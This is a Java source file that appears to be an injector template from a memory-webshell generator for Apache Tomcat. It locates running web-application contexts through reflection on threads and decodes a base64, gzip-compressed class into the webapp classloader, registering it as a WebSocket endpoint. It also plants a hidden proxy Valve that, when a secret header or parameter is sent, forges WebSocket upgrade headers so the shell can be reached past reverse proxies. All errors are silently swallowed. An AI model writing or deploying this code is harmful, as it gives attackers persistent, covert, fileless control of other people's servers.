package org.leo.jmg.mem.injectortpl.tomcat;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.HashSet;
import java.util.Map;
import java.util.Set;
import java.util.zip.GZIPInputStream;

/**
 * Tomcat WebSocket 反向代理兼容挂载。
 *
 * <p>额外 Valve 通过 JDK Proxy 实现，因此生成物无需携带第二个辅助类；命中门禁时
 * 补齐 WebSocket Upgrade 请求头并直接调用 Tomcat UpgradeUtil。</p>
 */
public class TomcatWebSocketByPassInjector implements InvocationHandler {
    private static String urlPattern;
    private static String shellClassName;
    private static String shellClass;
    private static String headerName;
    private static String headerValue;
    private static boolean ok;

    private Object nextValve;

    public TomcatWebSocketByPassInjector() {
        if (ok) return;
        try {
            Set<Object> contexts = getContext();
            if (contexts != null) {
                for (Object context : contexts) {
                    try {
                        inject(context, getShell(context));
                    } catch (Throwable ignored) {
                    }
                }
            }
        } catch (Throwable ignored) {
        } finally {
            ok = true;
            shellClass = null;
            shellClassName = null;
            urlPattern = null;
        }
    }

    /** 仅用作每个 Pipeline 独立的 Proxy InvocationHandler。 */
    private TomcatWebSocketByPassInjector(Object nextValve) {
        this.nextValve = nextValve;
    }

    public Set<Object> getContext() throws Exception {
        Set<Object> contexts = new HashSet<Object>();
        Set<Thread> threads = Thread.getAllStackTraces().keySet();
        for (Thread thread : threads) {
            String threadName = thread.getName();
            if (threadName.contains("ContainerBackgroundProcessor")) {
                Map children = (Map) getFieldValue(
                        getFieldValue(getFieldValue(thread, "target"), "this$0"),
                        "children");
                addChildContexts(contexts, children);
            } else if (threadName.contains("Poller") && !threadName.contains("ajp")) {
                try {
                    Object proto = getFieldValue(getFieldValue(
                            getFieldValue(getFieldValue(thread, "target"), "this$0"),
                            "handler"), "proto");
                    Object engine = getFieldValue(getFieldValue(
                            getFieldValue(getFieldValue(proto, "adapter"), "connector"),
                            "service"), "engine");
                    addChildContexts(contexts, (Map) getFieldValue(engine, "children"));
                } catch (Throwable ignored) {
                }
            } else if (thread.getContextClassLoader() != null) {
                try {
                    ClassLoader loader = thread.getContextClassLoader();
                    if (loader.getClass().getSimpleName().matches(".+WebappClassLoader")) {
                        Object resources = getFieldValue(loader, "resources");
                        if (resources != null && resources.getClass().getName().endsWith("Root")) {
                            Object context = getFieldValue(resources, "context");
                            if (context != null) contexts.add(context);
                        }
                    }
                } catch (Throwable ignored) {
                }
            }
        }
        return contexts;
    }

    private static void addChildContexts(Set<Object> contexts, Map children)
            throws Exception {
        if (children == null) return;
        for (Object host : children.values()) {
            Object nested = getFieldValue(host, "children");
            if (nested instanceof Map) contexts.addAll(((Map) nested).values());
        }
    }

    private ClassLoader getWebAppClassLoader(Object context) {
        try {
            return (ClassLoader) invokeMethod(context, "getClassLoader", null, null);
        } catch (Throwable ignored) {
            Object loader = invokeMethod(context, "getLoader", null, null);
            return (ClassLoader) invokeMethod(loader, "getClassLoader", null, null);
        }
    }

    @SuppressWarnings("all")
    private Object getShell(Object context) throws Exception {
        ClassLoader loader = getWebAppClassLoader(context);
        Class clazz;
        try {
            clazz = Class.forName(shellClassName, true, loader);
        } catch (ClassNotFoundException ignored) {
            byte[] bytes = gzipDecompress(decodeBase64(shellClass));
            Method defineClass = ClassLoader.class.getDeclaredMethod(
                    "defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
            defineClass.setAccessible(true);
            clazz = (Class) defineClass.invoke(loader, bytes,
                    Integer.valueOf(0), Integer.valueOf(bytes.length));
        }
        return clazz.newInstance();
    }

    private void inject(Object context, Object endpoint) throws Exception {
        Object servletContext = invokeMethod(context, "getServletContext", null, null);
        Object container = invokeMethod(servletContext, "getAttribute",
                new Class[]{String.class},
                new Object[]{"javax.websocket.server.ServerContainer"});
        if (container == null) {
            container = invokeMethod(servletContext, "getAttribute",
                    new Class[]{String.class},
                    new Object[]{"jakarta.websocket.server.ServerContainer"});
        }
        if (container == null) throw new IllegalStateException("WebSocket ServerContainer missing");

        ensureByPassValve(context);
        Object mapping = invokeMethod(container, "findMapping",
                new Class[]{String.class}, new Object[]{urlPattern});
        if (mapping == null) addEndpoint(container, context, endpoint);
    }

    private void ensureByPassValve(Object context) throws Exception {
        Object pipeline = invokeMethod(context, "getPipeline", null, null);
        try {
            Object valves = invokeMethod(pipeline, "getValves", null, null);
            for (int i = 0; i < Array.getLength(valves); i++) {
                Object valve = Array.get(valves, i);
                if (valve != null && Proxy.isProxyClass(valve.getClass())) {
                    InvocationHandler handler = Proxy.getInvocationHandler(valve);
                    if (handler.getClass().getName().equals(getClass().getName())) return;
                }
            }
        } catch (Throwable ignored) {
        }

        ClassLoader containerLoader = context.getClass().getClassLoader();
        Class valveClass = Class.forName("org.apache.catalina.Valve", true,
                containerLoader);
        Object valve = Proxy.newProxyInstance(valveClass.getClassLoader(),
                new Class[]{valveClass},
                new TomcatWebSocketByPassInjector(null));
        invokeMethod(pipeline, "addValve", new Class[]{valveClass},
                new Object[]{valve});
    }

    private void addEndpoint(Object container, Object context, Object endpoint)
            throws Exception {
        ClassLoader loader = getWebAppClassLoader(context);
        Class endpointConfigClass;
        Class builderClass;
        try {
            endpointConfigClass = Class.forName(
                    "javax.websocket.server.ServerEndpointConfig", true, loader);
            builderClass = Class.forName(
                    "javax.websocket.server.ServerEndpointConfig$Builder", true, loader);
        } catch (ClassNotFoundException ignored) {
            endpointConfigClass = Class.forName(
                    "jakarta.websocket.server.ServerEndpointConfig", true, loader);
            builderClass = Class.forName(
                    "jakarta.websocket.server.ServerEndpointConfig$Builder", true, loader);
        }
        Constructor constructor = builderClass.getDeclaredConstructor(
                Class.class, String.class);
        constructor.setAccessible(true);
        Object builder = constructor.newInstance(endpoint.getClass(), urlPattern);
        Object config = invokeMethod(builder, "build", null, null);
        invokeMethod(container, "setDefaultMaxTextMessageBufferSize",
                new Class[]{Integer.TYPE}, new Object[]{Integer.valueOf(52428800)});
        invokeMethod(container, "setDefaultMaxBinaryMessageBufferSize",
                new Class[]{Integer.TYPE}, new Object[]{Integer.valueOf(52428800)});
        invokeMethod(container, "addEndpoint", new Class[]{endpointConfigClass},
                new Object[]{config});
    }

    @Override
    public Object invoke(Object proxy, Method method, Object[] arguments) throws Throwable {
        String name = method.getName();
        if ("getNext".equals(name)) return nextValve;
        if ("setNext".equals(name)) {
            nextValve = arguments == null ? null : arguments[0];
            return null;
        }
        if ("backgroundProcess".equals(name)) return null;
        if ("isAsyncSupported".equals(name)) return Boolean.FALSE;
        if ("hashCode".equals(name)) return Integer.valueOf(System.identityHashCode(proxy));
        if ("equals".equals(name)) return Boolean.valueOf(proxy == arguments[0]);
        if ("toString".equals(name)) return getClass().getName();
        if ("invoke".equals(name) && arguments != null && arguments.length == 2) {
            if (tryUpgrade(arguments[0], arguments[1])) return null;
        }
        if (nextValve != null) return method.invoke(nextValve, arguments);
        return null;
    }

    private boolean tryUpgrade(Object request, Object response) {
        try {
            Object header = invokeMethod(request, "getHeader",
                    new Class[]{String.class}, new Object[]{headerName});
            if (header == null || !String.valueOf(header).contains(headerValue)) {
                header = invokeMethod(request, "getParameter",
                        new Class[]{String.class}, new Object[]{headerName});
                if (header == null || !String.valueOf(header).contains(headerValue)) {
                    return false;
                }
            }
            Object pathInfo = invokeMethod(request, "getPathInfo", null, null);
            String servletPath = String.valueOf(
                    invokeMethod(request, "getServletPath", null, null));
            String path = pathInfo == null ? servletPath
                    : servletPath + String.valueOf(pathInfo);
            Object servletContext = invokeMethod(request, "getServletContext", null, null);
            Object container = invokeMethod(servletContext, "getAttribute",
                    new Class[]{String.class},
                    new Object[]{"javax.websocket.server.ServerContainer"});
            if (container == null) {
                container = invokeMethod(servletContext, "getAttribute",
                        new Class[]{String.class},
                        new Object[]{"jakarta.websocket.server.ServerContainer"});
            }
            if (container == null) return false;
            Object mapping = invokeMethod(container, "findMapping",
                    new Class[]{String.class}, new Object[]{path});
            if (mapping == null) return false;

            addHeader(request, "Connection", "upgrade");
            addHeader(request, "Upgrade", "websocket");
            Object config = getFieldValue(mapping, "config");
            Object pathParams = getFieldValue(mapping, "pathParams");
            Class upgradeUtil = Class.forName(
                    "org.apache.tomcat.websocket.server.UpgradeUtil", true,
                    request.getClass().getClassLoader());
            Method[] methods = upgradeUtil.getMethods();
            for (int i = 0; i < methods.length; i++) {
                Method candidate = methods[i];
                if ("doUpgrade".equals(candidate.getName())
                        && candidate.getParameterTypes().length == 5) {
                    candidate.invoke(null,
                            new Object[]{container, request, response, config, pathParams});
                    return true;
                }
            }
        } catch (Throwable ignored) {
        }
        return false;
    }

    private void addHeader(Object request, String key, String value) throws Exception {
        Object coyoteRequest = getFieldValue(request, "coyoteRequest");
        Object mimeHeaders = invokeMethod(coyoteRequest, "getMimeHeaders", null, null);
        Object messageBytes = invokeMethod(mimeHeaders, "addValue",
                new Class[]{String.class}, new Object[]{key});
        invokeMethod(messageBytes, "setString", new Class[]{String.class},
                new Object[]{value});
    }

    @SuppressWarnings("all")
    public static byte[] decodeBase64(String value) throws Exception {
        try {
            Object decoder = Class.forName("java.util.Base64")
                    .getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class)
                    .invoke(decoder, value);
        } catch (Exception ignored) {
            Object decoder = Class.forName("sun.misc.BASE64Decoder").newInstance();
            return (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class)
                    .invoke(decoder, value);
        }
    }

    public static byte[] gzipDecompress(byte[] compressed) throws IOException {
        ByteArrayOutputStream output = new ByteArrayOutputStream();
        GZIPInputStream gzip = new GZIPInputStream(new ByteArrayInputStream(compressed));
        try {
            byte[] block = new byte[4096];
            int read;
            while ((read = gzip.read(block)) > 0) output.write(block, 0, read);
            return output.toByteArray();
        } finally {
            gzip.close();
            output.close();
        }
    }

    public static Object getFieldValue(Object target, String name) throws Exception {
        Class type = target.getClass();
        while (type != null && type != Object.class) {
            try {
                Field field = type.getDeclaredField(name);
                field.setAccessible(true);
                return field.get(target);
            } catch (NoSuchFieldException ignored) {
                type = type.getSuperclass();
            }
        }
        throw new NoSuchFieldException(name);
    }

    public static Object invokeMethod(Object target, String name,
                                      Class[] parameterTypes, Object[] arguments) {
        try {
            Class type = target instanceof Class ? (Class) target : target.getClass();
            Method method = null;
            while (type != null && method == null) {
                try {
                    method = type.getDeclaredMethod(name,
                            parameterTypes == null ? new Class[0] : parameterTypes);
                } catch (NoSuchMethodException ignored) {
                    type = type.getSuperclass();
                }
            }
            if (method == null) throw new NoSuchMethodException(name);
            method.setAccessible(true);
            return method.invoke(target instanceof Class ? null : target,
                    arguments == null ? new Object[0] : arguments);
        } catch (Exception e) {
            throw new IllegalStateException(name, e);
        }
    }
}
